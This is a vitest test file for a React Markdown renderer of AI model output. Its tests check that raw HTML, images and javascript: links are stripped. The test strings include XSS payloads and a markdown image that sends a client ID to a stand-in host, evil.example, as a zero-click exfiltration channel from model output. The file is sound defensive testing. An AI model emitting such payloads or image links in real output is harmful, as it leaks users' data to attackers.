/**
 * The AI answer renderer. The text is model output (untrusted), so beyond
 * "Markdown renders" these pin the safety posture: no raw HTML, no images
 * (an external image URL is an exfiltration channel that needs no click).
 */
import { renderToStaticMarkup } from "react-dom/server"
import { describe, expect, it } from "vitest"

import { MarkdownMessage } from "./MarkdownMessage"

const html = (text: string) => renderToStaticMarkup(<MarkdownMessage text={text} />)

describe("MarkdownMessage", () => {
  it("renders bold instead of showing the asterisks", () => {
    const out = html("共触发 **8 次告警（6 位客户）**")
    expect(out).toContain("<strong")
    expect(out).toContain("8 次告警（6 位客户）</strong>")
    expect(out).not.toContain("**")
  })

  it("renders GFM tables and inline code", () => {
    const out = html("| 客户 | 告警 |\n|---|---:|\n| 166916 | 3 |\n\n账户 `5-67042582`")
    expect(out).toContain("<table")
    expect(out).toContain("<td")
    expect(out).toContain("166916")
    expect(out).toContain("<code")
    expect(out).not.toContain("|---|")
  })

  it("never renders raw HTML from the model", () => {
    const out = html('<script>alert(1)</script><img src=x onerror="alert(2)">')
    expect(out).not.toContain("<script")
    expect(out).not.toContain("<img")
  })

  it("never renders images — only their alt text — so nothing is fetched", () => {
    const out = html("![secret](https://evil.example/log?d=client-166916)")
    expect(out).not.toContain("<img")
    expect(out).not.toContain("evil.example")
    expect(out).toContain("[secret]")
  })

  it("opens links in a new tab without referrer and drops javascript: URLs", () => {
    const out = html("[FOMC](https://www.federalreserve.gov/x) [bad](javascript:alert(1))")
    expect(out).toContain('target="_blank"')
    expect(out).toContain("noreferrer")
    expect(out).not.toContain("javascript:")
  })
})
